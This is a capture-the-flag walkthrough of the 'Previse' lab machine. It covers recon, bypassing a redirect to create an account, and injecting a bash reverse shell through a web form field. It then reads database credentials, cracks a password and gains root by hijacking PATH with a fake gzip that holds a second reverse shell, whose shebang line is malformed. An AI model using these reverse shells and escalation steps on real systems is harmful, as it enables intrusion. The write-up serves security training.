# PreVise Writeup

### Privilege Escalation

#### Reconnaissance:

As always we will start with nmap scanning in which we find there are two ports open in this box → port 22(ssh) and port 80 (http).

When we check this web server so we find a simple login page.

By seeing this page, my first approach was intercept the login request save it and use sql map for cracking:

```perl
sqlmap -r login.req --batch
```

But in the end it did not worked, now in the background I also started a gobuster run and after a while we find a subdomin ‘accounts.php’ if we open it in the browser so we redirects to login.php page but if we intercept this request in the burp suite then we can see a 302 found header.

#### Gain Access:

Now if we change `302 Found → 200 Ok` then we will land on a page where we can now make an account. 

Now we make a account there and get back on the login.php page then try to login again, and using the same credentials that we are now logged in.

Then we go to log data section in the website and go to file delimiter and intercept the request and then put a reverse shell in url encoded form.

```
bash -c 'exec bash -i &>/dev/tcp/#ip/#port <&1'
```

and we get shell on the box.

For stabilizing the shell we can use following commands:

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

#### User.txt:

Now I have a stable shell on the box, now my approach is always look into the configuration files.

In the configuration files we get the sql database password and a user name `m4lwhere`

Now we go to sql database and try to retrieve some more information.

```
mysql -u root -p'mySQL_p@ssw0rd!:)'-e'show databases;'
mysql> mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e'select * from accounts;’
```

I found a hash password in the database and with the help of hashcat we can crack the password: `lovecody112235!`

Now we can connect through using credentials m4lwhere:lovecody112235!

We can got our first user.txt flag here and now we have to 

#### Root.txt:

Now as always we do sudo -l and we analyze that the box is storing data in gzip file so we will made our own which directly gives us root.
now make a file call gzip and write this :

```
#bin/bash bash -i >& /dev/tcp/#ip/#port 0>&1
and then : > chmod +x gzip
export PATH=.:$PATH
```

Now we download the file in the box and unzip the file.
then run the following command:

```
sudo /opt/scripts/access_backup.sh
```

Now we simply so to /root folder and get the root.txt flag.

Hope you like this writeup, if you like it please show some love by follow me on:

GitHub: [https://github.com/mvaibhavm09](https://github.com/mvaibhavm09)

LinkedIn: [https://linkedin.com/in/mvaibhavm09](https://linkedin.com/in/mvaibhavm09)

Twitter:  [https://twitter.com/mvaibhavm09](https://twitter.com/mvaibhavm09) 

Happy Hacking :)
